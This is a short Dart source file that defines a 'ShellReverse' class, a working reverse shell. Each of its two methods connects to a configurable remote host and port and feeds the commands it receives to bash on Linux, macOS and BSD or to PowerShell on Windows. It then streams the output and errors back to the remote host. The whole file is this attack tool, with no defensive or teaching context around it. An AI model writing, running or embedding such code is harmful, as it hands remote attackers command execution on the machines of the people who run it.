import 'dart:io';
import 'dart:convert';
import 'dart:typed_data';

class ShellReverse {
  final int port;
  final String host;

  const ShellReverse({required this.port, required this.host});

  /// this function runs on linux, bsd and mac because it runs by bash
  /// which is used in the 3, it will only fail if it doesn't have bash.
  void runLinuxMacosBsd() => Socket.connect(host, port).then(
        (Socket socket) => socket.listen(
          (Uint8List data) =>
              Process.start('/bin/bash', ['-a']).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout.transform(utf8.decoder).listen((String output) {
              socket.write(output);
              socket.flush();
            });
            process.stderr.transform(utf8.decoder).listen((String error) {
              socket.write(error);
              socket.flush();
            });
          }),
          onError: (error) {
            print(error);
          },
          onDone: () => socket.destroy(),
        ),
      );

  void runWindows() => Socket.connect(host, port).then(
        (Socket socket) => socket.listen(
          (Uint8List data) =>
              Process.start('powershell.exe', []).then((Process process) {
            process.stdin.writeln(String.fromCharCodes(data).trim());
            process.stdout.transform(utf8.decoder).listen((String output) {
              socket.write(output);
              socket.flush();
            });
            process.stderr.transform(utf8.decoder).listen((String error) {
              socket.write(error);
              socket.flush();
            });
          }),
          onError: (error) {
            print(error);
          },
          onDone: () => socket.destroy(),
        ),
      );
}
